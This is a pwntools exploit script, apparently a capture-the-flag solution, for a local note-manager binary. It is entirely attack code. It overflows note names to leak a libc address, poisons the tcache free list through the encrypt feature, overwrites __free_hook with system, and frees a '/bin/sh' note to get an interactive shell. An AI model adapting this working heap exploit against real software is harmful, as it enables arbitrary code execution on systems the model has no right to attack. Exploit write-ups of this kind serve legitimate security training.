from pwn import *

r = process('./note')
context.clear(os='linux', arch='x86_64', log_level='debug')
bin = ELF('./note')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

def CreateNote(name, word_num, content):
    r.sendlineafter(b'$ ', b'1')
    r.sendafter(b'Note Name: ', name)
    r.sendlineafter(b'words do you want? ', str(word_num).encode())
    r.sendafter(b'your content:', content)
    r.recvuntil(b'Done.\n')

def EditNote(idx, yes, name, word_num, content):
    r.sendlineafter(b'$ ', b'2')
    r.sendlineafter(b'you want to edit?', str(idx).encode())
    if yes:
        r.sendlineafter(b'? (y/n)', b'y')
    else:
        r.sendlineafter(b'? (y/n)', b'n')
    r.sendafter(b'Note Name: ', name)
    r.sendlineafter(b'words do you want? ', str(word_num).encode())
    r.send(content)
    r.recvuntil(b'Done.\n')

def SaveNote(idx):
    r.sendlineafter(b'$ ', b'3')
    r.sendlineafter(b'idx do you want to save?', str(idx).encode())
    r.recvuntil(b'Done.\n')

def CopyNote(idx, idx2):
    r.sendlineafter(b'$ ', b'4')
    r.sendlineafter(b'do you want to copy?', str(idx).encode())
    r.sendlineafter(b'idx do you wanna save?', str(idx2).encode())
    r.recvuntil(b'Done.\n')

def ListNote(idx):
    r.sendlineafter(b'$ ', b'5')
    r.sendlineafter(b'do you want to read?', str(idx).encode())

def RemoveNote(idx):
    r.sendlineafter(b'$ ', b'6')
    r.sendlineafter(b'note do you want to remove?', str(idx).encode())

def EncryptNote(idx, key_length, key):
    r.sendlineafter(b'$ ', b'7')
    r.sendlineafter(b'do you want to encrypt?', str(idx).encode())
    r.sendlineafter(b'Key length: ', str(key_length).encode())
    r.sendline(key)

def DecryptNote(idx, key_length, key):
    r.sendlineafter(b'$ ', b'8')
    r.sendlineafter(b'note do you want to decrypt?', str(idx).encode())
    r.sendlineafter(b'Key length: ', str(key_length).encode())
    r.sendline(key)
    r.recvuntil(b'Done.\n')

def debug():
    gdb.attach(r, '''b*0x0000000000401c9a''')

CreateNote(b'a'*0xf5 + b'\x30' + b'\n', 0x10, b'/bin/sh'.ljust(0x10, b'\x00'))
SaveNote(0)
CreateNote(b'Do Tien Dat\n', 0x410, b'b'*0x410)
SaveNote(1)
CreateNote(b'Do Tien Dat\n', 0x10, b'a'*0x10)
SaveNote(2)
RemoveNote(1)
EncryptNote(0, 1, b'\x00')

ListNote(0)
r.recvuntil(b'Content:\n')
r.recv(0x20)
libc.address = u64(r.recv(8)) - 0x1ebbe0
log.success('Libc base: %#x' % libc.address)

CreateNote(b'a'*0xf5 + b'\x28\n', 0x10, b'a'*0x10)
SaveNote(3)
CreateNote(b'Do Tien Dat\n', 0x30, b'b'*0x30)
SaveNote(4)
CreateNote(b'Do Tien Dat\n', 0x30, b'c'*0x30)
SaveNote(5)
CreateNote(b'Do Tien Dat\n', 0x30, b'd'*0x30)
SaveNote(6)
EncryptNote(2, 1, b'\x00')
DecryptNote(2, 1, b'\x00')
RemoveNote(4)
RemoveNote(3)
ListNote(2)
r.recvuntil(b'Content:\n')
r.recv(0x20)
NextChunk = u64(r.recv(8))
log.info('Next chunk: %#x' % NextChunk)
EncryptNote(2, 8, p64(libc.symbols['__free_hook'] ^ NextChunk))
CreateNote(b'Do Tien Dat\n', 0x30, b'a'*0x30)
SaveNote(4)
CreateNote(b'Do Tien Dat\n', 0x30, p64(libc.symbols['system']) + b'\x00'*0x28)
SaveNote(3)
RemoveNote(0)
r.interactive()